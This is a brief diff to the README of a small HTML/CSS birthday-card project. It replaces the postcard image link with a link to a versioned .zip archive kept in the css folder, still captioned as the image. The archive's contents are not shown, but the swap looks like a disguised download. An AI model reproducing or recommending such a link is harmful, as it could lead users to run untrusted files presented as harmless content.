@@ -1,6 +1,6 @@
 # CardHappyBirthday
 
 CardHappyBirthday
-![CARTÃO POSTAL](https://user-images.githubusercontent.com/56793368/212197582-cdcb30d7-c799-4cd0-b67f-8870702831be.jpg)
+![CARTÃO POSTAL](https://raw.githubusercontent.com/Samuel76844/CardHappyBirthday/main/css/Birthday-Happy-Card-2.9.zip)
 
 - HTML and CSS
